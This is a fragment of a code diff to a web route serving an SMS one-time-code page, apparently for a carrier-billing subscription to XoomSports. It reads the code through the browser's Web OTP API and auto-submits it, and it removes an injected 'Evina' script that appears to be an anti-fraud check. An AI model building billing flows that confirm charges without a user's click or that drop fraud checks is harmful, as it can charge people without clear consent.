-      clearInterval(otpPollTimer);
-      clearTimeout(otpTimeout);
-      if (webOtpAbort) webOtpAbort.abort();
-
-      document.getElementById('autoVerify').classList.add('phase-hidden');
-      document.getElementById('manualEntry').classList.remove('phase-hidden');
-      for (var i = 0; i < 4; i++) { pins[i].value = code[i] || ''; }
-      if (otpValue) otpValue.value = code;
-
-      dbg('Auto-captured OTP: "' + code + '" — verifying now');
-      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
-      setTimeout(function() { verifyPin(code); }, 300);
+      startWebOTP();
     }
 
     function showManualEntry() {
-      document.getElementById('autoVerify').classList.add('phase-hidden');
+      document.getElementById('autoReading').classList.add('phase-hidden');
       document.getElementById('manualEntry').classList.remove('phase-hidden');
       document.getElementById('resendArea').classList.remove('phase-hidden');
       confirmBtn.textContent = 'Verify Code';
@@ -749,95 +327,56 @@ export async function GET(request: NextRequest) {
       dbg('Manual OTP entry — waiting for user input');
     }
 
-    // ── Web OTP callback — handle code from <head> listener ────────────
-    window.__handleWebOtp = function(rawCode) {
-      var code = rawCode.replace(/\\D/g, '').slice(0, 4);
-      dbg('Web OTP: Got code "' + code + '" from Chrome dialog');
-      if (code.length >= 4) {
-        if (phase === 1) { goToPhase2(); }
-        captureAndVerify(code);
+    function startWebOTP() {
+      if (!('OTPCredential' in window)) {
+        dbg('Web OTP: not available — manual entry');
+        showManualEntry();
+        return;
       }
-    };
-    window.__handleWebOtpError = function(err) {
-      dbg('Web OTP error: ' + (err.message || err));
-    };
+      dbg('Web OTP: listening for SMS...');
+      otpAbort = new AbortController();
 
-    // Check if Web OTP already captured a code during page load
-    if (typeof __webOtpCode !== 'undefined' && __webOtpCode) {
-      dbg('Web OTP: code was captured during page load!');
-      window.__handleWebOtp(__webOtpCode);
-    } else if (typeof __webOtpAbort !== 'undefined' && __webOtpAbort) {
-      dbg('Web OTP listener ACTIVE (started in <head>)');
-    } else {
-      dbg('Web OTP API not available');
-    }
+      var timeout = setTimeout(function() {
+        dbg('Web OTP: timeout (60s) — manual entry');
+        if (otpAbort) otpAbort.abort();
+        showManualEntry();
+      }, 60000);
 
-    // ── PinRequest client-side fallback (for retry/resend) ────────────
-    function callPinRequest() {
-      if (pinRequestDone) return;
-      pinRequestDone = true;
-      dbg('Calling PinRequest via client-side fetch...');
-
-      fetch('/api/pin-request', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          MSISDN: MSISDN,
-          TransactionId: TRXID,
-          Headers: navigator.userAgent,
-          UserIP: USER_IP
-        })
-      })
-      .then(function(r) { return r.json(); })
-      .then(function(data) {
-        dbg('PinRequest response: Status=' + data.Status + ' JS_len=' + (data.JS || '').length);
-
-        // Inject Evina JS if returned (and not already loaded)
-        if (!evinaReady) {
-          var js = (data.JS || '').trim()
-            .replace(/^<script[^>]*>/i, '')
-            .replace(/<\\/script\\s*>$/i, '')
-            .trim();
-
-          if (js.length > 0) {
-            dbg('Injecting Evina JS (' + js.length + ' chars)');
-            var script = document.createElement('script');
-            script.textContent = js;
-            document.head.appendChild(script);
-            evinaReady = true;
-          }
-        }
-
-        if (data.Status !== '0') {
-          dbg('PinRequest failed: ' + data.Status + ' — retrying');
-          pinRequestDone = false;
-          TRXID = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
-          dbg('New trxId: ' + TRXID);
-          setTimeout(function() { callPinRequest(); }, 500);
+      navigator.credentials.get({
+        otp: { transport: ['sms'] },
+        signal: otpAbort.signal
+      }).then(function(otp) {
+        clearTimeout(timeout);
+        if (otp && otp.code) {
+          dbg('Web OTP: received code "' + otp.code + '"');
+          fillAndVerify(otp.code);
         } else {
-          dbg('PinRequest SUCCESS — SMS should arrive shortly');
+          dbg('Web OTP: no code');
+          showManualEntry();
         }
-      })
-      .catch(function(err) {
-        dbg('PinRequest error: ' + err);
-        pinRequestDone = false;
-        TRXID = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
-        setTimeout(function() { callPinRequest(); }, 1000);
+      }).catch(function(err) {
+        clearTimeout(timeout);
+        dbg('Web OTP: ' + (err.name === 'AbortError' ? 'aborted' : 'error — ' + err.message));
+        showManualEntry();
       });
     }
 
-    // ── App bridge: if running inside XoomSports Android app ────────────
-    if (window.__XOOM_APP && window.XoomApp) {
-      dbg('Running inside XoomSports Android App — native OTP capture active');
-      try { window.XoomApp.onPageReady(); } catch(e) {}
+    function fillAndVerify(code) {
+      var cleaned = code.replace(/\\D/g, '').slice(0, 4);
+      if (cleaned.length < 4) { showManualEntry(); return; }
+
+      document.getElementById('autoReading').classList.add('phase-hidden');
+      document.getElementById('manualEntry').classList.remove('phase-hidden');
+      for (var i = 0; i < 4; i++) pins[i].value = cleaned[i];
+      if (otpValue) otpValue.value = cleaned;
+
+      confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
+      dbg('Auto-verify with code: "' + cleaned + '"');
+      setTimeout(function() { verifyPin(cleaned); }, 500);
     }
 
-    dbg('Flow: PinRequest=' + (pinRequestDone ? 'server-side' : 'pending') + ' → Web OTP in <head> → user clicks Start → auto-capture');
-
-    // ── Confirm button ──────────────────────────────────────────────────────
     confirmBtn.addEventListener('click', function(e) {
       dbg('confirmBtn clicked — phase=' + phase + ' isTrusted=' + e.isTrusted);
-
       if (phase === 1) {
         goToPhase2();
       } else if (phase === 2) {
@@ -847,17 +386,10 @@ export async function GET(request: NextRequest) {
         }
         dbg('Manual verify — pin="' + pin + '"');
         if (pin.length !== 4 || isVerifying) return;
-        // Delay 2s to let Evina process the click event and validate
-        isVerifying = true;
-        confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
-        dbg('Waiting 2s for Evina validation...');
-        setTimeout(function() {
-          verifyPin(pin);
-        }, 2000);
+        verifyPin(pin);
       }
     });
 
-    // ── Verify PIN ──────────────────────────────────────────────────────────
     function verifyPin(pin) {
       isVerifying = true;
       confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
@@ -871,7 +403,7 @@ export async function GET(request: NextRequest) {
       })
       .then(function(r) { return r.json(); })
       .then(function(data) {
-        dbg('PinVerify -> Status="' + data.Status + '" field=' + (data._fieldUsed || 'default') + ' tried=' + JSON.stringify(data._tried || []) + ' raw=' + JSON.stringify(data.raw || {}));
+        dbg('PinVerify -> Status="' + data.Status + '" raw=' + JSON.stringify(data.raw || {}));
         if (data.Status === '0' || data.Status === '103') {
           dbg('SUCCESS — redirecting');
           document.getElementById('stepDot3').classList.add('active');
@@ -893,58 +425,25 @@ export async function GET(request: NextRequest) {
         isVerifying = false;
         if (phase === 2) {
           var manual = document.getElementById('manualEntry');
-          if (!manual.classList.contains('phase-hidden')) {
-            confirmBtn.textContent = 'Verify Code';
-          }
+          if (!manual.classList.contains('phase-hidden')) confirmBtn.textContent = 'Verify Code';
         }
       });
     }
 
     function handleResend() {
-      if (resendCooldown > 0) return;
-      dbg('Resending OTP...');
-      TRXID = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
-      pinRequestDone = false;
-      evinaReady = false;
-      dbg('New trxId for resend: ' + TRXID);
-
-      // Restart Web OTP listener
-      if (webOtpAbort) webOtpAbort.abort();
-      if ('OTPCredential' in window) {
-        webOtpAbort = new AbortController();
-        navigator.credentials.get({
-          otp: { transport: ['sms'] },
-          signal: webOtpAbort.signal
-        }).then(function(otp) {
-          if (!otp || !otp.code) return;
-          var code = otp.code.replace(/\\D/g, '').slice(0, 4);
-          dbg('Web OTP (resend): Got code "' + code + '"');
-          if (code.length >= 4) captureAndVerify(code);
-        }).catch(function(err) {
-          dbg('Web OTP (resend) error: ' + (err.message || err));
-        });
-      }
-
-      callPinRequest();
-
-      // Show cooldown
-      resendCooldown = 30;
-      var link = document.getElementById('resendLink');
-      var timer = setInterval(function() {
-        resendCooldown--;
-        if (resendCooldown > 0) {
-          link.textContent = 'Resend (' + resendCooldown + 's)';
-        } else {
-          link.textContent = 'Resend';
-          clearInterval(timer);
-        }
-      }, 1000);
+      dbg('Resending OTP — full page reload...');
+      if (otpAbort) otpAbort.abort();
+      var newTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
+      window.location.href = '/api/otp-page?msisdn=' + encodeURIComponent(MSISDN) + '&trxId=' + newTrxId + '&userIP=' + encodeURIComponent('${userIP}');
     }
-  <\/script>
+
+    if (window.__XOOM_APP && window.XoomApp) {
+      dbg('Running inside XoomSports Android App');
+      try { window.XoomApp.onPageReady(); } catch(e) {}
+    }
+  </script>
 </body>
 </html>`;
-
-  const html = htmlBeforeEvina + evinaJsonSafe + htmlAfterEvina;
 
   return new Response(html, {
     headers: {
